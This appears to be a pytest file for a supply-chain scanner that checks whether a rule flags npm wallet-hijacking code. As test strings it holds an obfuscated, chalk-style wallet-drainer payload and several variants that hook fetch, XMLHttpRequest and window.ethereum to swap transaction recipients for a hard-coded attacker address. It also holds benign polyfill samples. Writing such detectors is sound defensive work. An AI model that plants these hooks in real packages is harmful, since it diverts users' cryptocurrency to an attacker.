from __future__ import annotations

from pathlib import Path

import pytest

from ca9.analyzers.package_code import analyze_package_snapshots
from ca9.artifacts.model import ArtifactFile, ArtifactSnapshot
from ca9.core.models import Artifact, Package

RULE = "npm-wallet-network-hijack"
ATTACKER = "0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976"
CHALK_STYLE_PAYLOAD = (
    "const _0x1a=['ZmV0Y2g=','ZXRoZXJldW0=','cmVxdWVzdA=='];"
    "const _d=(i)=>Buffer.from(_0x1a[i],'base64').toString();\n"
    "(function(){const g=typeof window!=='undefined'?window:globalThis;const of=g[_d(0)];\n"
    "g[_d(0)]=function(u,o){if(o&&o.body){o.body=String(o.body).replace("
    f"/0x[a-fA-F0-9]{{40}}/g,'{ATTACKER}')}}return of.apply(this,arguments)}};\n"
    "if(g[_d(1)]){const r=g[_d(1)][_d(2)];g[_d(1)][_d(2)]=async function(a){"
    f"if(a&&a.params&&a.params[0]){{a.params[0].to='{ATTACKER}'}}return r.call(this,a)}}}}}})();\n"
    "module.exports={red:(s)=>s};\n"
)


def _signals(tmp_path: Path, source: str, filename: str = "index.js") -> list[str]:
    path = tmp_path / "package" / filename
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(source)
    snapshot = ArtifactSnapshot(
        package=Package(name="pkg", version="1.0.0", ecosystem="npm", dependency_kind="direct"),
        artifact=Artifact(kind="npm-tarball", url="https://registry.npmjs.org/pkg/-/pkg-1.0.0.tgz"),
        archive_path=tmp_path / "pkg.tgz",
        extract_dir=tmp_path,
        files=(ArtifactFile(f"package/{filename}", path, path.stat().st_size),),
    )
    return [finding.signal_type for finding in analyze_package_snapshots((snapshot,))]


def test_chalk_style_wallet_drainer_without_install_script_blocks(tmp_path):
    assert RULE in _signals(tmp_path, CHALK_STYLE_PAYLOAD)


@pytest.mark.parametrize(
    "source",
    [
        "const g = globalThis; const of = g.fetch;\n"
        "g['fe' + 'tch'] = function (u, o) { return of(u, o); };\n",
        "if (typeof globalThis.fetch === 'undefined' || true) {\n"
        "  const of = globalThis.fetch;\n"
        "  globalThis.fetch = function (u, o) {\n"
        f"    o.body = String(o.body).replace(/0x[a-fA-F0-9]{{40}}/g, '{ATTACKER}');\n"
        "    return of(u, o);\n  };\n}\n",
        "const eth = window.ethereum; const send = eth.request;\n"
        f"eth.request = async function (a) {{ a.params[0].to = '{ATTACKER}'; return send(a); }};\n",
        "const t = ['b3Blbg==']; const d = (i) => atob(t[i]);\n"
        "const open = XMLHttpRequest.prototype[d(0)];\n"
        "XMLHttpRequest.prototype[d(0)] = function () { return open.apply(this, arguments); };\n",
        "const of = window.fetch;\n"
        "window['fetch'] = function (u, o) { o.body = o.body.replace(/0x[0-9a-f]{40}/gi, 'x'); "
        "return of(u, o); };\n",
        "Object.defineProperty(window, 'ethereum', { get() { return proxy; } });\n"
        "const k = '\\x65\\x74\\x68\\x65\\x72\\x65\\x75\\x6d';\n",
        "const sol = window.phantom.solana;\n"
        "sol.signTransaction = async (tx) => tx; const BTC = '1BoatSLRHtKNngkdXEeobR76b53LETtpyT';\n",
        "const A = ['0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976'];\n"
        "const of = fetch;\nfetch = async function (...a) { return of(...a); };\n",
        "const _0x1 = ['fetch', 'prototype', 'open'];\nfunction _0x2(i) { return _0x1[i]; }\n"
        "const o = window[_0x2(0)];\nwindow[_0x2(0)] = async function (...a) { return o(...a); };\n",
        "const _t = ['prototype', 'open', 'fetch'];\nfunction _d(i) { return _t[i]; }\n"
        "XMLHttpRequest[_d(0)][_d(1)] = function () {};\n",
        f"const A = ['{ATTACKER}'];\nfunction hook(provider) {{\n"
        "  for (const m of ['request', 'send']) {\n"
        "    Object.defineProperty(provider, m, { value: function () {} });\n  }\n}\n"
        "if (window.ethereum) hook(window.ethereum);\n",
    ],
    ids=[
        "concatenated-fetch-name",
        "polyfill-guard-that-rewrites-addresses",
        "aliased-ethereum-request",
        "decoded-xhr-open",
        "bracketed-fetch-with-address-regex",
        "defineProperty-ethereum-with-encoded-name",
        "solana-sign-with-btc-address",
        "bare-global-fetch-with-address",
        "string-table-window-fetch",
        "string-table-xhr-prototype-chain",
        "defineProperty-dynamic-method-on-provider",
    ],
)
def test_hidden_or_address_rewriting_overrides_still_report(tmp_path, source):
    assert RULE in _signals(tmp_path, source)


@pytest.mark.parametrize(
    "source",
    [
        "const nodeFetch = require('node-fetch');\n"
        "if (typeof globalThis.fetch === 'undefined') globalThis.fetch = nodeFetch;\n",
        "(function (self) {\n  if (!self.fetch) {\n    self.fetch = fetch;\n"
        "    self.Headers = Headers;\n    self.Request = Request;\n    self.Response = Response;\n"
        "  }\n})(typeof self !== 'undefined' ? self : this);\n",
        "const ADDRESS = /^0x[a-fA-F0-9]{40}$/;\n"
        "export async function connect() {\n  const provider = window.ethereum;\n"
        "  const accounts = await provider.request({ method: 'eth_requestAccounts' });\n"
        "  return accounts.filter((a) => ADDRESS.test(a));\n}\n",
        "export function setGlobalProvider(p) { window.ethereum = p; }\n"
        "const MULTICALL = '0xcA11bde05977b3631167028862bE2a173976CA11';\n",
        f"exports['request'] = request; const TREASURY = '{ATTACKER}';\n",
        "const cache = {}; cache[key(1)] = 2; const label = 'ZmV0Y2g=';\n",
        f"let fetch = require('node-fetch'); fetch = fetch.default; const A = '{ATTACKER}';\n",
        "export function client(opts) { const { fetch = globalThis.fetch } = opts; return fetch; }\n"
        f"const A = '{ATTACKER}';\n",
        f"function make(fetch = nodeFetch) {{ return fetch; }}\nconst A = '{ATTACKER}';\n",
        "for (const k in m) Object.defineProperty(exports, k, { get: () => m[k] });\n"
        f"const w = window.ethereum; const A = '{ATTACKER}';\n",
        "const EVENTS = ['install', 'activate', 'fetch'];\nfunction ev(i) { return EVENTS[i]; }\n"
        "self.addEventListener(ev(2), (e) => e.respondWith(fetch(e.request)));\n",
    ],
    ids=[
        "fetch-polyfill-only-when-missing",
        "whatwg-fetch-style-polyfill",
        "wallet-sdk-reads-provider",
        "provider-injection-without-obfuscation",
        "exports-request-with-address",
        "computed-call-without-hook",
        "local-fetch-binding",
        "destructuring-default",
        "parameter-default",
        "exports-defineProperty-loop",
        "service-worker-event-table",
    ],
)
def test_polyfills_and_wallet_sdks_stay_quiet(tmp_path, source):
    assert RULE not in _signals(tmp_path, source)
